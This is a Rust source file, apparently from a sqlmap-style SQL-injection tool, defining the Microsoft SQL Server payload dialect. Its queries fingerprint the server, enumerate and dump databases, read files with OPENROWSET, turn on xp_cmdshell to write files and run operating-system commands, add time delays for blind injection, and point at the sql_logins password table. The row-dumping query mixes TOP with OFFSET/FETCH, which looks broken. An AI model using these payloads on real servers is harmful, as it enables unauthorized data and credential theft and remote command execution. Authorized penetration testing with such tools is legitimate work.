//! Microsoft SQL Server.

use crate::Dialect;
use sqlmap_core::dbms_kind::Dbms;

pub struct MssqlDialect;

impl Dialect for MssqlDialect {
    fn dbms(&self) -> Dbms { Dbms::MSSQL }
    fn banner_query(&self) -> &'static str { "@@VERSION" }
    fn current_user_query(&self) -> &'static str { "SYSTEM_USER" }
    fn current_db_query(&self) -> &'static str { "DB_NAME()" }
    fn hostname_query(&self) -> &'static str { "@@SERVERNAME" }
    fn is_dba_query(&self) -> &'static str { "IS_SRVROLEMEMBER('sysadmin')" }
    fn list_dbs(&self) -> &'static str { "SELECT name FROM master..sysdatabases FOR XML PATH('')" }
    fn list_tables(&self, db: &str) -> String {
        format!("SELECT name FROM {db}..sysobjects WHERE xtype='U' FOR XML PATH('')")
    }
    fn list_columns(&self, db: &str, table: &str) -> String {
        format!("SELECT name FROM {db}..syscolumns WHERE id=OBJECT_ID('{db}..{table}') FOR XML PATH('')")
    }
    fn count_rows(&self, db: &str, table: &str) -> String {
        format!("SELECT COUNT(*) FROM {db}..{table}")
    }
    fn dump_rows(&self, _db: &str, table: &str, cols: &[&str], start: usize, count: usize) -> String {
        let cols = if cols.is_empty() { "*".to_string() } else { cols.join(",") };
        format!("SELECT TOP {count} {cols} FROM {table} ORDER BY 1 OFFSET {start} ROWS FETCH NEXT {count} ROWS ONLY")
    }
    fn file_read(&self, path: &str) -> String {
        format!("(SELECT * FROM OPENROWSET(BULK '{path}', SINGLE_CLOB) AS x)")
    }
    fn file_write(&self, bytes_hex: &str, dest: &str) -> String {
        // bcp out + xp_cmdshell pattern.
        format!("EXEC xp_cmdshell 'echo {bytes_hex} > {dest}'")
    }
    fn os_cmd(&self, cmd: &str) -> String {
        // Enable + execute via xp_cmdshell.
        format!(
            "EXEC sp_configure 'show advanced options',1; RECONFIGURE; \
             EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; \
             EXEC xp_cmdshell '{}'",
            cmd.replace('\'', "''")
        )
    }
    fn substr(&self, expr: &str, pos: usize, len: usize) -> String {
        format!("SUBSTRING(({expr}),{pos},{len})")
    }
    fn ord(&self, ch: &str) -> String { format!("ASCII({ch})") }
    fn concat(&self, parts: &[&str]) -> String { parts.join("+") }
    fn sleep(&self, seconds: u32) -> String { format!("WAITFOR DELAY '0:0:{seconds}'") }
    fn password_table(&self) -> &'static str { "master.sys.sql_logins" }
    fn comment(&self) -> &'static str { "--" }
}
